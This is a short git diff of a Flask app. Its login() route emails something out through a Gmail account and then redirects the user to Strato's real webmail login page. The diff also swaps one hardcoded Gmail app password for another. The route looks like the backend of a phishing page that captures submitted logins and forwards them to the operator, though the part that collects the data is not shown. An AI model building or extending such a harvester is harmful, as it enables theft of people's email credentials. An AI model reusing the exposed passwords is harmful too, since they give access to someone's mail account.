@@ -9,7 +9,7 @@ app.config['MAIL_SERVER'] = 'smtp.gmail.com'
 app.config['MAIL_PORT'] = 587
 app.config['MAIL_USE_TLS'] = True
 app.config['MAIL_USERNAME'] = 'smartdevtechemail@gmail.com'  # Your Gmail email address
-app.config['MAIL_PASSWORD'] = 'nanniisqgsllwfuq'  # Your Gmail password or App Password
+app.config['MAIL_PASSWORD'] = 'qhewdrdrlviqkexf'# Your Gmail password or App Password
 
 mail = Mail(app)
 
@@ -31,7 +31,7 @@ def login():
     except Exception as e:
         flash(f'Failed to send email. Error: {str(e)}', 'error')
 
-    return redirect(url_for())
+    return redirect('https://webmail.strato.com/appsuite/ui')
 
 if __name__ == '__main__':
     app.run(debug=True)
